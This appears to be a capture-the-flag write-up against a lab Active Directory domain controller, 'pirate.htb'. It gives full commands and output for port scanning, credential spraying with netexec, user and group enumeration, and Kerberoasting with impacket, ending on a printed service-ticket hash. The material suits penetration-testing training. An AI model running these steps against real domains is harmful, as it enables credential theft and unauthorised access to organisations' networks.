## NMAP SCAN
```
nmap -sSCV -p- 10.129.244.95
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 02:37 -0400
Nmap scan report for 10.129.244.95
Host is up (0.094s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 13:45:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2025-06-09T14:05:15
|_Not valid after:  2026-06-09T14:05:15
|_ssl-date: 2026-04-19T13:47:13+00:00; +6h59m57s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49921/tcp open  msrpc         Microsoft Windows RPC
49948/tcp open  msrpc         Microsoft Windows RPC
49971/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-19T13:46:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 1s, median: 6h59m56s

```

It is a DC as kerberos, ldap and DNS are there! **pirate.htb**  **DC01.pirate.htb**

port 80 is IIS nothing interesting....

port 389/636/3268 are LDAP ! 

port 5985 is evil-winrm ! 

## NETEXEC 
```
netexec smb 10.129.244.95 -u user.txt -p password.txt
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

this confirm that the creds can authenticate
lets try to use Impacket-GetuserSPN....
```
sudo impacket-GetUserSPNs -dc-ip 10.129.244.95 'pirate.htb/pentest:p3nt3st2025!&'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name         MemberOf                         PasswordLastSet             LastLogon                   Delegation  
--------------------  -----------  -------------------------------  --------------------------  --------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-15 19:36:34.388000  2025-06-09 12:03:37.380258  constrained
```

lets enum users using netexec 

```
sudo netexec smb 10.129.244.95 -u user.txt -p password.txt --users

[*] Copying default configuration file
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
SMB         10.129.244.95   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.244.95   445    DC01             Administrator                 2025-06-08 14:32:36 0       Built-in account for administering the computer/domain 
SMB         10.129.244.95   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.244.95   445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account 
SMB         10.129.244.95   445    DC01             a.white_adm                   2026-01-16 00:36:34 0        
SMB         10.129.244.95   445    DC01             a.white                       2025-06-08 19:33:01 0        
SMB         10.129.244.95   445    DC01             pentest                       2025-06-09 13:40:23 0        
SMB         10.129.244.95   445    DC01             j.sparrow                     2025-06-09 15:08:44 0        
SMB         10.129.244.95   445    DC01             [*] Enumerated 7 local users: PIRATE
```

now lets enum groups as well... this time we will use ldap 
```
sudo netexec ldap 10.129.244.95 -u user.txt -p password.txt --groups 
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!& 
LDAP        10.129.244.95   389    DC01             -Group-                                  -Members- -Description-                                               
LDAP        10.129.244.95   389    DC01             Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
LDAP        10.129.244.95   389    DC01             Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
LDAP        10.129.244.95   389    DC01             Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP        10.129.244.95   389    DC01             Print Operators                          0         Members can administer printers installed on domain controllers
LDAP        10.129.244.95   389    DC01             Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
LDAP        10.129.244.95   389    DC01             Replicator                               0         Supports file replication in a domain
LDAP        10.129.244.95   389    DC01             Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
LDAP        10.129.244.95   389    DC01             Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
LDAP        10.129.244.95   389    DC01             Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
LDAP        10.129.244.95   389    DC01             Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer                                                                                                                                                                                                       
LDAP        10.129.244.95   389    DC01             Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
LDAP        10.129.244.95   389    DC01             IIS_IUSRS                                1         Built-in group used by Internet Information Services.
LDAP        10.129.244.95   389    DC01             Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
LDAP        10.129.244.95   389    DC01             Event Log Readers                        0         Members of this group can read event logs from local machine
LDAP        10.129.244.95   389    DC01             Certificate Service DCOM Access          1         Members of this group are allowed to connect to Certification Authorities in the enterprise
LDAP        10.129.244.95   389    DC01             RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.                                                                                                                                                                                                                                        
LDAP        10.129.244.95   389    DC01             RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.                                                           
LDAP        10.129.244.95   389    DC01             RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.                                                                                   
LDAP        10.129.244.95   389    DC01             Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
LDAP        10.129.244.95   389    DC01             Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
LDAP        10.129.244.95   389    DC01             Remote Management Users                  2         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.                                                                                                                                                                 
LDAP        10.129.244.95   389    DC01             Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
LDAP        10.129.244.95   389    DC01             Domain Computers                         0         All workstations and servers joined to the domain
LDAP        10.129.244.95   389    DC01             Domain Controllers                       0         All domain controllers in the domain
LDAP        10.129.244.95   389    DC01             Schema Admins                            1         Designated administrators of the schema
LDAP        10.129.244.95   389    DC01             Enterprise Admins                        1         Designated administrators of the enterprise
LDAP        10.129.244.95   389    DC01             Cert Publishers                          1         Members of this group are permitted to publish certificates to the directory
LDAP        10.129.244.95   389    DC01             Domain Admins                            1         Designated administrators of the domain
LDAP        10.129.244.95   389    DC01             Domain Users                             0         All domain users
LDAP        10.129.244.95   389    DC01             Domain Guests                            0         All domain guests
LDAP        10.129.244.95   389    DC01             Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
LDAP        10.129.244.95   389    DC01             RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
LDAP        10.129.244.95   389    DC01             Server Operators                         0         Members can administer domain servers
LDAP        10.129.244.95   389    DC01             Account Operators                        0         Members can administer domain user and group accounts
LDAP        10.129.244.95   389    DC01             Pre-Windows 2000 Compatible Access       4         A backward compatibility group which allows read access on all users and groups in the domain
LDAP        10.129.244.95   389    DC01             Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
LDAP        10.129.244.95   389    DC01             Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
LDAP        10.129.244.95   389    DC01             Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage                                                                                                                                                                                                    
LDAP        10.129.244.95   389    DC01             Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP        10.129.244.95   389    DC01             Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP        10.129.244.95   389    DC01             Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
LDAP        10.129.244.95   389    DC01             Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        10.129.244.95   389    DC01             Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
LDAP        10.129.244.95   389    DC01             Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.                                                                                                                                                                                                     
LDAP        10.129.244.95   389    DC01             Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
LDAP        10.129.244.95   389    DC01             Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
LDAP        10.129.244.95   389    DC01             DnsAdmins                                0         DNS Administrators Group
LDAP        10.129.244.95   389    DC01             DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
LDAP        10.129.244.95   389    DC01             IT                                       1         
LDAP        10.129.244.95   389    DC01             Domain Secure Servers                    1 
```

3 admins and users
2 guest
4 access to a legacy system which has read access to all groups and domains
2 remote management, wmi 

using bloodhound got SID's of a.white_adm user 
Domain: S-1-5-21-4107424128-4158083573-1300325248
Owner:S-1-5-21-4107424128-4158083573-1300325248-512

DC is running win server 2019, found **MS01.pirate.htb** and **WEB01.pirate.htb**

kerberostable users 
GMSA_ADFS_PROD$ @PIRATE.HTB
A.WHITE_ADM@PIRATE.HTB

found the TGS of a.white_adm

```
sudo impacket-GetUserSPNs -dc-ip 10.129.244.95 'pirate.htb/pentest:p3nt3st2025!&' -request-user a.white_adm

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name         MemberOf                         PasswordLastSet             LastLogon                   Delegation  
--------------------  -----------  -------------------------------  --------------------------  --------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-16 07:36:34.388000  2025-06-09 23:03:37.380258  constrained 

$krb5tgs$23$*a.white_adm$PIRATE.HTB$pirate.htb/a.white_adm*$412662854d544d931f4629d416852a77$5f91abd2574e1a7f5ec8046f48dc8ae3717799cb0e3fcf46eedd8351fe69cfde44212c3a7d0cc5e8b08f211047b0740c59b0aa0f004014a67f72f1e55aae6151a4439bdc2e4ea05b95aa0b82bccc9a25fb580810df267020f0cbccb952dbe82f37c089d816cb6747ad48cfd5f30efd2baee9f20c2f3c73771c4ef37efb1774d38ccb574e45c63639eac6e40836f9d9d82bd46121ede5d4f500373c8f3f906a3fcda5840089b29d5b8582002eb48883027a4779f8d994e184a1e1c26b97484c99c59b3f626c4f5a2d074fe5feb6f744ff12df2f91b35f1c8b8cc8fe15d180a8bd01457d8b9704aec25fd7674121a0751c4e983c13af0ba0fc9af7a72f26537f73fb04609e255800d5f3ddc1f51f0440ca27ee84f59e4eb31b47bf1f168adf747f49ab19cc118e03c0ef4b5b21a41a8f68ef7edda2e112c362538c6d45b4dfca30e1d3b26766b4d0091cbe10a29beb5825a7f2d9d6566ecff627f92f28d9470dfbbb34ddae4b360b982aaa2a65926d5e2f64e36c32b50c8df88426cec25af6a6d152df1b5bee89a293aa210461717346e864a153235cf182ab77aa719165bfc263bfbbe01f9da87916d3f43d1fdf7733d9484406b8006463a2ce46f3462691788eee7b351c93260f624c7751b0cff4ff1a95b40955a673319dfc39da14e036b0f48e6fa175b6c5f0e82c23447a06d6156a15307d272b7b5f8d07e5e31278cc6e8dfe690477190f394d06673373f8474960f8678b5ade81b599463d1584de09906b886118e9203d7d3b682ef052e6f64a679780035b96c4a5c58e38c68b60407cc07bf2342f2710c00df4dd377e9a3fff978dac5f3a9531af88c7438e9a0c3b601cc1dc4d69c38287cde7855aaee006805d48c228bc23fe431b990e5f2de158d61b235dfbdaa891d54d56d04725face72bc3290ce3975edc4106ea03ad5ddc0dfc82be984d35ee717ee748d1ee0fdc6af0509abde4996743dc6b6df9f7b495953bbc831301d595fea8c9a505ed9633108124c1591a410fb920b9651bf4211cf98fd78cc1e9c7564e6a30d6392577794c4736a60209971e31aac70c2bad0456dad7c5f54e8027cb25d3b085e989ec35a74463be8bbaebe064f223a1972367bea558972b513fe0d96a0c180b36e1b61869fd536321ffb34330d89ab54d39f89dd3350490ac02d0d6d733a9a02e5d8b48e700a476e2a5a6cf07cfb1883e93366e316ac2c3414ba8e79286ad3c11f0d616e7243f4d88079445221022804b4e48b6f623b5a3d373797dd44812d62fd0e2d072277665b16de319fcdddd3cf4d123dd259584d83bff78016e0db91d425b6d71d76e177525470b852ff5caaf6f9d1f8b47e943b91d238001a9515b1a45f8696c33e21a3035495decea68bc2933a372b454e62c001c57f90df9f376683d111e372a857988b91a521ebc96d735db5f1cb09eb91ff3ff48c63895f63fb4a
```

